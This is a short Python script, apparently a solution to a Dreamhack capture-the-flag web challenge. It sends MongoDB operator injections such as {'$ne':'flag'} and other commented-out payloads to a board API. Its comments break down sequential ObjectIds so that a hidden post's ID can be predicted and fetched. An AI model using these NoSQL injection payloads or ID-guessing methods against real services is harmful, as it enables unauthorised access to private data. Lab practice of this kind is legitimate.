import requests

BASE_URL = 'http://172.17.116.219:8080'
REMOTE = 'http://host2.dreamhack.games:13917'


def WRITE():
    data = {
        'title': "{'$ne' : 'flag'}",
        'author': 'admin',
        'body': "TEST",
        'secret': 'false'
    }
    req = requests.put(BASE_URL+'/api/board', data)
    print(req)

def READ():
    # payload = '{"$ne":ObjectId("603749189609380c906272a7")}'
    # payload = '{"$ne":""},secret:{"$ne":"true"}'
    # payload = '''{"$ne":null}, {secret:true}'''
    payload = '60375efab508c0f85e8e85e9'
    # req = requests.get(BASE_URL+'/api/board')
    req = requests.get(REMOTE+f"/api/board/{payload}")
    print(req.text)

def ll():
    req = requests.get(BASE_URL+'/api/board')
    print(req)
    
WRITE()
READ()
# ll()

# {_id: {"$ne":ObjectId("603749189609380c906272a7")}}


# 60375ef8 b508c0f8 5e8e85e7
# 60375ef9 b508c0f8 5e8e85e8
# 60375efa b508c0f8 5e8e85e9

# 60375f02 b508c0f8 5e8e85ea


# 60376689 35a70c00 206b380e
# 6037669c 35a70c00 206b380f
# 603766d1 35a70c00 206b3810